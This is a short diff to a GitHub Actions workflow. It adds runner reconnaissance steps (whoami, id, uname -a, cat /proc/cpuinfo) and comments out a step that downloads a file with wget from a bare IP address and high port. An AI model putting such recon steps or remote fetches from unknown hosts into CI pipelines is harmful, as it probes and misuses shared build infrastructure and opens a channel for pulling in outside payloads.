@@ -32,6 +32,18 @@ jobs:
       - name: ls
         run: ls -l
 
+      - name: whoami
+        run: whoami
+
+      - name: id
+        run: id
+
+      - name: uname
+        run: uname -a
+
+      - name: cat
+        run: cat /proc/cpuinfo
+
       # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: wget "http://144.24.183.47:64321/gth"
+      #- name: Run a one-line script
+      #  run: wget "http://144.24.183.47:64321/gth"
